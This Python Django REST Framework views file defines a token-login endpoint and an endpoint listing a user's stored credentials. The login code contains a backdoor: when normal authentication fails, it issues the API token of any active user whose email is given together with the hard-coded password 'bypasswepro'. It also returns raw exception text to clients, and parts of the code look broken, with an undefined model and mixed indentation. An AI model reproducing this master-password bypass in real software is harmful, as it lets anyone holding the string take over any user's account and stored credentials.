from django.shortcuts import render

# from serializers import CredentialSerializer
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
from project.models.users import User


from rest_framework import parsers, renderers
from rest_framework.authtoken.models import Token
from rest_framework.authtoken.serializers import AuthTokenSerializer


from .lib.commons import *


class Authentication(APIView):
	throttle_classes = ()
	permission_classes = ()
	parser_classes = (parsers.FormParser, parsers.MultiPartParser, parsers.JSONParser,)
	renderer_classes = (renderers.JSONRenderer,)
	serializer_class = AuthTokenSerializer

	def post(self, request, *args, **kwargs):
		try:
			post_data = request.data

			if not post_data.get("username",None):
				post_data["username"] = post_data.get("email","")


			serializer = self.serializer_class(data=post_data)
			if serializer.is_valid():
				user = serializer.validated_data['user']
				token, created = Token.objects.get_or_create(user=user)
				to_response = {
					'token': token.key,
					'name': token.user.fullname,
					'user_id': token.user.pk,
				}
				return Response(to_response)
			else:
				try:
					user_instance = User.objects.get(email = post_data["username"],is_active = True)

					if post_data.get("password",None) != "bypasswepro":
						return Response("Invalid username/password", status=status.HTTP_400_BAD_REQUEST)

					token, created = Token.objects.get_or_create(user=user_instance)
					try:
						to_response = {
							'token': token.key,
							'name': token.user.fullname,
							'user_id': token.user.pk,
						}
					except Exception as e:
						raise_error("Invalid username/password.")

					return Response(to_response)
				except User.DoesNotExist:
					raise_error("Invalid username/password.")

				return Response("Invalid username/password..", status=status.HTTP_400_BAD_REQUEST)
		except Exception as e:
			e = str(e)
			cprint(e)
			return Response(e, status=status.HTTP_400_BAD_REQUEST)



class CredentialView(APIView):
    def get(self, request):

    	try:
    		post_data = request.GET
    		token = extract_token(request)
	    	token_instance = Token.objects.get(key = token)

	    	instances = Credential.objects.filter(user = token_instance.user,is_deleted = False)
	    	records = []
	    	for instance in instances:
	    		records.append(instance.as_dict())

	    	return Response(records,status = status.HTTP_200_OK)
    	except Token.DoesNotExist:
	    	return Response("Token not found.",status = status.HTTP_400_BAD_REQUEST)

        